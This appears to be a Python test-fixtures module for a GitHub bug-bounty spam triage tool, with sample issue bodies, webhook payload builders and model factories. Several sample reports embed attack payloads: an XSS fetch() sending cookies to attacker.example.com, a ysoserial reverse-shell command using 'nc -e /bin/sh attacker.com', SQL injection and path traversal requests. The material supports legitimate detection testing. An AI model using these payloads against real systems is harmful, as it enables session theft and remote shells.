"""Shared test fixtures and sample data for BountyGuard tests.

This module provides reusable constants and factory functions used across
multiple test modules. It contains:

- Sample issue body strings covering spam, legitimate, and edge-case scenarios.
- GitHub webhook payload dictionaries for various event types and actions.
- Factory functions for constructing model instances in tests.
- Pre-built SpamScore, LLMResult, TriageResult, and IssueRecord instances.

Usage in test modules::

    from tests.fixtures import (
        SPAM_ISSUE_BODY,
        LEGITIMATE_ISSUE_BODY,
        make_issues_opened_payload,
        make_ping_payload,
    )
"""

from __future__ import annotations

import hashlib
import hmac
import json
from datetime import datetime, timezone
from typing import Optional

from bounty_guard.models import (
    IssueRecord,
    LLMResult,
    SpamScore,
    TriageDecision,
    TriageResult,
)


# ---------------------------------------------------------------------------
# Webhook secret used in all fixture payloads
# ---------------------------------------------------------------------------

TEST_WEBHOOK_SECRET: str = "test-webhook-secret-fixture"


# ---------------------------------------------------------------------------
# Sample issue bodies
# ---------------------------------------------------------------------------

# Clearly AI-generated / spam security report that should trigger all signals.
SPAM_ISSUE_BODY: str = """\
Dear Security Team,

I am writing to report a critical vulnerability I recently discovered in your
application that could have serious security implications.

Severity: Critical
Vulnerability type: Remote code execution
Affected version: All versions
Impact: Critical
Remediation: Please patch this issue immediately.

This critical vulnerability allows complete system compromise and full server
takeover. It also enables account takeover, privilege escalation, and
sensitive data exposure. An unauthenticated attacker can achieve RCE remotely.

This is a zero-day vulnerability that constitutes a serious data breach risk.

Please fix this as soon as possible.

Best regards,
Security Researcher
"""

# Legitimate, well-written path traversal security report.
LEGITIMATE_PATH_TRAVERSAL_BODY: str = """\
## Path Traversal Vulnerability in /api/v1/upload

The file upload endpoint at `/api/v1/upload` does not sanitise the `filename`
parameter in multipart form data, allowing an authenticated user to escape
the upload directory using `../` sequences (CWE-22 / OWASP A01).

## Steps to Reproduce

1. Authenticate as a regular user and obtain a session token.
2. Send the following HTTP request:

```http
POST /api/v1/upload HTTP/1.1
Host: example.com
Authorization: Bearer <your-token>
Content-Type: multipart/form-data; boundary=----boundary

------boundary
Content-Disposition: form-data; name="file"; filename="../../../etc/passwd"

test content
------boundary--
```

3. Observe that the server writes the file to `/etc/passwd`.

## Environment

- Application version: 2.3.1
- OS: Ubuntu 22.04 LTS
- Python: 3.11.4

## Impact

An authenticated attacker can overwrite arbitrary files on the server,
potentially replacing system files or application configuration, leading to
privilege escalation or persistent backdoor installation.
"""

# Legitimate SQL injection report with code evidence.
LEGITIMATE_SQL_INJECTION_BODY: str = """\
## SQL Injection in /api/users Endpoint

The `id` query parameter on `GET /api/users?id=<value>` is interpolated
directly into a raw SQL query without parameterisation, enabling classic
boolean-based SQL injection (CWE-89).

## Steps to Reproduce

1. Send the following request:

```http
GET /api/users?id=1'+OR+'1'='1 HTTP/1.1
Host: example.com
```

2. Observe that the response returns all user rows instead of just user 1.

```sql
-- Vulnerable query (reconstructed from error messages)
SELECT * FROM users WHERE id = '1' OR '1'='1'
```

## Steps to reproduce

- Verified with `sqlmap -u "https://example.com/api/users?id=1" --dbs`
- Confirmed database enumeration is possible.

## Impact

Unauthenticated read access to the entire users table, including password
hashes and PII. CVSS v3.1 Base Score: 9.8 (Critical).
"""

# Legitimate XSS report.
LEGITIMATE_XSS_BODY: str = """\
## Reflected XSS in Search Parameter

The `q` parameter on `/search` is reflected into the HTML response without
HTML-encoding, enabling reflected cross-site scripting (CWE-79, OWASP A03).

## Steps to Reproduce

1. Visit the following URL in a browser:

```
https://example.com/search?q=<script>alert(document.cookie)</script>
```

2. Observe that an alert dialog fires with the session cookie value.

## Proof of Concept

```javascript
// Payload that exfiltrates cookies to attacker server
<script>
fetch('https://attacker.example.com/steal?c=' + document.cookie);
</script>
```

## Impact

An attacker can steal authenticated session cookies or perform actions on
behalf of the victim by crafting a malicious link and social-engineering
the victim into clicking it.
"""

# Borderline / uncertain report: has some detail but missing repro steps.
BORDERLINE_ISSUE_BODY: str = """\
I found a potential security issue in the authentication module.

The login endpoint appears to be vulnerable to timing attacks because the
password comparison does not use a constant-time comparison function.
An attacker could potentially exploit this to enumerate valid usernames.

The issue is in `auth/login.py` around line 87 where `password == stored_hash`
is used instead of `hmac.compare_digest(password, stored_hash)`.

This affects version 1.5.0 and potentially earlier versions.
I haven't tested this fully but the code pattern looks suspicious.
"""

# Extremely short / empty-like body.
SHORT_VAGUE_BODY: str = "There is a critical security bug. Please fix it."

# Body with a generic greeting only.
GENERIC_GREETING_BODY: str = (
    "Dear Security Team,\n\n"
    "I hope this message finds you well. "
    "I discovered a vulnerability in your system. " * 10
)

# Body with CVE template boilerplate.
CVE_TEMPLATE_BODY: str = """\
Vulnerability Report

Severity: High
CVSS Score: 8.5
CWE-89: SQL Injection
Vulnerability type: SQL Injection
Affected version: 1.0.0 - 2.5.0
Remediation: Update to version 2.6.0

A SQL injection vulnerability exists in the application.
References:
- https://cve.mitre.org/
- https://owasp.org/
"""

# Body with no code evidence whatsoever.
NO_CODE_BODY: str = (
    "There is a remote code execution vulnerability in the file upload feature. "
    "An attacker can upload a malicious file and execute arbitrary commands. "
    "This affects all users and should be patched immediately. "
    "The vulnerability is triggered by uploading a specially crafted file. "
    "An authenticated attacker can leverage this to gain full server access. " * 3
)

# Body with code but no reproduction steps.
CODE_NO_REPRO_BODY: str = """\
I found a potential buffer overflow in the C extension.

Here is the vulnerable code:

```c
void process_input(char *input) {
    char buf[256];
    strcpy(buf, input);  // No bounds checking - buffer overflow!
}
```

This function is called with user-controlled input and does not validate
the length, leading to a classic stack-based buffer overflow vulnerability.
An attacker can use a ROP chain to achieve arbitrary code execution.
"""

# Body with reproduction steps but no code.
REPRO_NO_CODE_BODY: str = (
    "Steps to reproduce:\n"
    "1. Navigate to the login page.\n"
    "2. Enter a username with a single quote.\n"
    "3. Observe the SQL error message.\n\n"
    "This indicates a SQL injection vulnerability that could allow "
    "an attacker to dump the database. "
    "The severity is critical and affects all authenticated users. " * 3
)

# Body that should score as legitimate (all signals clear).
FULL_LEGITIMATE_BODY: str = """\
## Deserialization Vulnerability in Java Object Handler

The `/api/objects/deserialize` endpoint accepts a Base64-encoded Java
serialized object and deserializes it without validation, enabling remote
code execution via gadget chains (CWE-502).

## Steps to Reproduce

1. Start a listener: `nc -lvp 4444`
2. Generate a payload with ysoserial:

```bash
java -jar ysoserial.jar CommonsCollections1 'nc -e /bin/sh attacker.com 4444' | base64
```

3. Send the payload:

```http
POST /api/objects/deserialize HTTP/1.1
Content-Type: application/json

{"data": "<base64-encoded-payload>"}
```

4. Observe a reverse shell on the listener.

## Environment

- Version: 3.1.2
- JDK: 11.0.20
- Commons Collections: 3.2.1

## Impact

Unauthenticated remote code execution. An attacker can run arbitrary
operations as the application process user (typically `www-data`).

CVSS v3.1 score: 9.8 (Critical) — CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H
"""


# ---------------------------------------------------------------------------
# GitHub webhook payload factories
# ---------------------------------------------------------------------------


def make_ping_payload(
    repository_full_name: str = "owner/testrepo",
    zen: str = "Speak like a human.",
) -> dict:
    """Build a GitHub 'ping' webhook payload.

    Args:
        repository_full_name: Repository in ``owner/name`` format.
        zen:                  GitHub Zen quote included in ping events.

    Returns:
        A dictionary representing the ping webhook payload.
    """
    return {
        "zen": zen,
        "hook_id": 12345,
        "hook": {
            "type": "App",
            "id": 12345,
            "active": True,
            "events": ["issues"],
        },
        "repository": {
            "id": 1,
            "full_name": repository_full_name,
            "private": False,
        },
        "sender": {
            "login": "octocat",
            "id": 1,
        },
    }


def make_issues_opened_payload(
    repository_full_name: str = "owner/testrepo",
    issue_number: int = 1,
    issue_title: str = "Critical security vulnerability",
    issue_body: str = SPAM_ISSUE_BODY,
    author_login: str = "badactor",
    installation_id: Optional[int] = 456,
    html_url: Optional[str] = None,
    action: str = "opened",
) -> dict:
    """Build a GitHub ``issues`` webhook payload for an opened/reopened event.

    Args:
        repository_full_name: Repository in ``owner/name`` format.
        issue_number:         GitHub issue number.
        issue_title:          Title of the issue.
        issue_body:           Markdown body of the issue.
        author_login:         GitHub login of the issue author.
        installation_id:      GitHub App installation ID (None to omit).
        html_url:             HTML URL of the issue (auto-generated if None).
        action:               Event action, e.g. ``'opened'`` or
                              ``'reopened'``.

    Returns:
        A dictionary representing the webhook payload.
    """
    if html_url is None:
        html_url = (
            f"https://github.com/{repository_full_name}/issues/{issue_number}"
        )

    payload: dict = {
        "action": action,
        "issue": {
            "number": issue_number,
            "title": issue_title,
            "body": issue_body,
            "html_url": html_url,
            "state": "open",
            "user": {
                "login": author_login,
                "id": 9999,
            },
            "labels": [],
            "created_at": "2024-01-15T10:00:00Z",
            "updated_at": "2024-01-15T10:00:00Z",
        },
        "repository": {
            "id": 42,
            "full_name": repository_full_name,
            "private": False,
            "html_url": f"https://github.com/{repository_full_name}",
        },
        "sender": {
            "login": author_login,
            "id": 9999,
        },
    }

    if installation_id is not None:
        payload["installation"] = {"id": installation_id, "node_id": "MDIz"}

    return payload


def make_issues_labeled_payload(
    repository_full_name: str = "owner/testrepo",
    issue_number: int = 1,
    label_name: str = "spam-suspected",
    installation_id: Optional[int] = 456,
) -> dict:
    """Build a GitHub ``issues`` webhook payload for a 'labeled' action.

    Args:
        repository_full_name: Repository in ``owner/name`` format.
        issue_number:         GitHub issue number.
        label_name:           Name of the label that was applied.
        installation_id:      GitHub App installation ID.

    Returns:
        A dictionary representing the labeled webhook payload.
    """
    payload: dict = {
        "action": "labeled",
        "issue": {
            "number": issue_number,
            "title": "Security report",
            "body": "Test body.",
            "html_url": f"https://github.com/{repository_full_name}/issues/{issue_number}",
            "state": "open",
            "user": {"login": "reporter", "id": 111},
            "labels": [{"name": label_name, "color": "e11d48"}],
        },
        "label": {"name": label_name, "color": "e11d48"},
        "repository": {
            "id": 42,
            "full_name": repository_full_name,
            "private": False,
        },
        "sender": {"login": "bounty-guard[bot]", "id": 200},
    }
    if installation_id is not None:
        payload["installation"] = {"id": installation_id}
    return payload


def make_payload_bytes(payload: dict) -> bytes:
    """Serialise a webhook payload dictionary to JSON bytes.

    Args:
        payload: The webhook payload dictionary.

    Returns:
        UTF-8 encoded JSON bytes suitable for use as a request body.
    """
    return json.dumps(payload, separators=(",", ":")).encode("utf-8")


def sign_payload(
    payload_bytes: bytes,
    secret: str = TEST_WEBHOOK_SECRET,
) -> str:
    """Compute the GitHub-style HMAC-SHA256 signature for a payload.

    Args:
        payload_bytes: Raw payload bytes.
        secret:        Shared webhook secret.

    Returns:
        Signature string in the form ``"sha256=<hex_digest>"``.
    """
    mac = hmac.new(
        secret.encode("utf-8"), msg=payload_bytes, digestmod=hashlib.sha256
    )
    return f"sha256={mac.hexdigest()}"


# ---------------------------------------------------------------------------
# Model instance factories
# ---------------------------------------------------------------------------


def make_spam_score(
    vague_description: bool = False,
    missing_reproduction_steps: bool = False,
    cve_template_detected: bool = False,
    no_code_evidence: bool = False,
    excessive_severity_claims: bool = False,
    generic_greeting: bool = False,
    suspiciously_short: bool = False,
    total_score: Optional[float] = None,
) -> SpamScore:
    """Create a SpamScore with specified signal values.

    If ``total_score`` is not provided it is computed automatically as the
    fraction of fired signals over the total signal count (7).

    Args:
        vague_description:          Whether vague description signal fired.
        missing_reproduction_steps: Whether missing repro steps signal fired.
        cve_template_detected:      Whether CVE template signal fired.
        no_code_evidence:           Whether no code evidence signal fired.
        excessive_severity_claims:  Whether excessive severity signal fired.
        generic_greeting:           Whether generic greeting signal fired.
        suspiciously_short:         Whether short body signal fired.
        total_score:                Override for total_score; computed if None.

    Returns:
        A populated :class:`~bounty_guard.models.SpamScore` instance.
    """
    signals = [
        vague_description,
        missing_reproduction_steps,
        cve_template_detected,
        no_code_evidence,
        excessive_severity_claims,
        generic_greeting,
        suspiciously_short,
    ]
    computed_score = sum(signals) / 7.0 if total_score is None else total_score
    return SpamScore(
        vague_description=vague_description,
        missing_reproduction_steps=missing_reproduction_steps,
        cve_template_detected=cve_template_detected,
        no_code_evidence=no_code_evidence,
        excessive_severity_claims=excessive_severity_claims,
        generic_greeting=generic_greeting,
        suspiciously_short=suspiciously_short,
        total_score=computed_score,
    )


def make_llm_result(
    spam_probability: float = 0.0,
    reasoning: str = "",
    model: str = "gpt-4o-mini",
    skipped: bool = False,
    error: Optional[str] = None,
) -> LLMResult:
    """Create an LLMResult with the given values.

    Args:
        spam_probability: Spam probability from the LLM (0.0–1.0).
        reasoning:        Human-readable explanation.
        model:            Model name.
        skipped:          Whether LLM classification was skipped.
        error:            Error message if applicable.

    Returns:
        A populated :class:`~bounty_guard.models.LLMResult` instance.
    """
    return LLMResult(
        spam_probability=spam_probability,
        reasoning=reasoning,
        model=model,
        skipped=skipped,
        error=error,
    )


def make_triage_result(
    decision: TriageDecision = TriageDecision.LEGITIMATE,
    spam_score: Optional[SpamScore] = None,
    llm_result: Optional[LLMResult] = None,
    rule_triggered: bool = False,
    llm_triggered: bool = False,
    label_applied: Optional[str] = None,
    comment_posted: bool = False,
    reasoning: str = "Automated triage result.",
) -> TriageResult:
    """Create a TriageResult with the given values.

    Args:
        decision:        Final triage decision.
        spam_score:      Rule-based score breakdown (defaults to clean SpamScore).
        llm_result:      LLM result (defaults to skipped LLMResult).
        rule_triggered:  Whether the rule threshold was exceeded.
        llm_triggered:   Whether the LLM threshold was exceeded.
        label_applied:   GitHub label that was applied, if any.
        comment_posted:  Whether a comment was posted.
        reasoning:       Human-readable explanation.

    Returns:
        A populated :class:`~bounty_guard.models.TriageResult` instance.
    """
    if spam_score is None:
        spam_score = make_spam_score()
    if llm_result is None:
        llm_result = make_llm_result(skipped=True)
    return TriageResult(
        decision=decision,
        spam_score=spam_score,
        llm_result=llm_result,
        rule_triggered=rule_triggered,
        llm_triggered=llm_triggered,
        label_applied=label_applied,
        comment_posted=comment_posted,
        reasoning=reasoning,
    )


def make_issue_record(
    repo_full_name: str = "owner/repo",
    issue_number: int = 1,
    issue_title: str = "Test security issue",
    issue_url: str = "https://github.com/owner/repo/issues/1",
    author_login: str = "reporter",
    decision: TriageDecision = TriageDecision.LEGITIMATE,
    spam_score: Optional[SpamScore] = None,
    llm_result: Optional[LLMResult] = None,
    label_applied: Optional[str] = None,
    comment_posted: bool = False,
    reasoning: str = "Test reasoning.",
) -> IssueRecord:
    """Create an IssueRecord with the given values.

    Args:
        repo_full_name: Repository in ``owner/name`` format.
        issue_number:   GitHub issue number.
        issue_title:    Issue title.
        issue_url:      HTML URL of the issue.
        author_login:   GitHub login of the author.
        decision:       Triage decision.
        spam_score:     Rule-based score (defaults to clean SpamScore).
        llm_result:     LLM result (defaults to skipped LLMResult).
        label_applied:  GitHub label applied, if any.
        comment_posted: Whether a comment was posted.
        reasoning:      Human-readable reasoning string.

    Returns:
        A populated :class:`~bounty_guard.models.IssueRecord` instance.
    """
    triage_result = make_triage_result(
        decision=decision,
        spam_score=spam_score,
        llm_result=llm_result,
        label_applied=label_applied,
        comment_posted=comment_posted,
        reasoning=reasoning,
        rule_triggered=(decision == TriageDecision.SPAM),
    )
    return IssueRecord(
        repo_full_name=repo_full_name,
        issue_number=issue_number,
        issue_title=issue_title,
        issue_url=issue_url,
        author_login=author_login,
        triage_result=triage_result,
    )


# ---------------------------------------------------------------------------
# Pre-built fixture instances
# ---------------------------------------------------------------------------

# A typical spam SpamScore with most signals fired.
SPAM_SPAM_SCORE: SpamScore = make_spam_score(
    vague_description=True,
    missing_reproduction_steps=True,
    cve_template_detected=True,
    no_code_evidence=True,
    excessive_severity_claims=True,
    generic_greeting=True,
    suspiciously_short=False,
    total_score=6 / 7,
)

# A clean SpamScore with no signals fired.
CLEAN_SPAM_SCORE: SpamScore = make_spam_score(
    total_score=0.0,
)

# A borderline SpamScore hovering near the threshold.
BORDERLINE_SPAM_SCORE: SpamScore = make_spam_score(
    vague_description=True,
    missing_reproduction_steps=True,
    no_code_evidence=True,
    total_score=3 / 7,
)

# LLM result indicating high spam probability.
HIGH_SPAM_LLM_RESULT: LLMResult = make_llm_result(
    spam_probability=0.92,
    reasoning=(
        "The report uses a generic greeting and lacks specific reproduction "
        "steps or code evidence. Multiple unsupported severity claims are made."
    ),
    model="gpt-4o-mini",
    skipped=False,
)

# LLM result indicating low spam probability (legitimate report).
LOW_SPAM_LLM_RESULT: LLMResult = make_llm_result(
    spam_probability=0.08,
    reasoning=(
        "The report includes a working HTTP proof-of-concept, specific version "
        "information, and clear reproduction steps. The technical detail is "
        "consistent with a genuine security report."
    ),
    model="gpt-4o-mini",
    skipped=False,
)

# LLM result that was skipped (disabled).
SKIPPED_LLM_RESULT: LLMResult = make_llm_result(skipped=True)

# Pre-built TriageResult for a spam decision.
SPAM_TRIAGE_RESULT: TriageResult = make_triage_result(
    decision=TriageDecision.SPAM,
    spam_score=SPAM_SPAM_SCORE,
    llm_result=HIGH_SPAM_LLM_RESULT,
    rule_triggered=True,
    llm_triggered=True,
    label_applied="spam-suspected",
    comment_posted=True,
    reasoning=(
        "Issue flagged as suspected spam. "
        "Rule score: 0.86 (threshold: 0.60). "
        "LLM score: 0.92 (threshold: 0.70). "
        "Fired signals: vague_description, missing_reproduction_steps, "
        "cve_template_detected, no_code_evidence, excessive_severity_claims, "
        "generic_greeting."
    ),
)

# Pre-built TriageResult for a legitimate decision.
LEGITIMATE_TRIAGE_RESULT: TriageResult = make_triage_result(
    decision=TriageDecision.LEGITIMATE,
    spam_score=CLEAN_SPAM_SCORE,
    llm_result=LOW_SPAM_LLM_RESULT,
    rule_triggered=False,
    llm_triggered=False,
    label_applied=None,
    comment_posted=False,
    reasoning=(
        "Issue appears to be a legitimate security report. "
        "Rule score: 0.00 (threshold: 0.60). "
        "LLM score: 0.08 (threshold: 0.70)."
    ),
)

# Pre-built TriageResult for an uncertain decision.
UNCERTAIN_TRIAGE_RESULT: TriageResult = make_triage_result(
    decision=TriageDecision.UNCERTAIN,
    spam_score=BORDERLINE_SPAM_SCORE,
    llm_result=SKIPPED_LLM_RESULT,
    rule_triggered=False,
    llm_triggered=False,
    label_applied="spam-suspected",
    comment_posted=True,
    reasoning=(
        "Issue is borderline; human review recommended. "
        "Rule score: 0.43 (threshold: 0.60). "
        "LLM classification: disabled."
    ),
)

# Pre-built IssueRecord instances.
SPAM_ISSUE_RECORD: IssueRecord = IssueRecord(
    repo_full_name="acme/webapp",
    issue_number=101,
    issue_title="Critical RCE vulnerability in all versions",
    issue_url="https://github.com/acme/webapp/issues/101",
    author_login="spammer99",
    triage_result=SPAM_TRIAGE_RESULT,
)

LEGITIMATE_ISSUE_RECORD: IssueRecord = IssueRecord(
    repo_full_name="acme/webapp",
    issue_number=102,
    issue_title="Path traversal in /api/v1/upload",
    issue_url="https://github.com/acme/webapp/issues/102",
    author_login="goodresearcher",
    triage_result=LEGITIMATE_TRIAGE_RESULT,
)
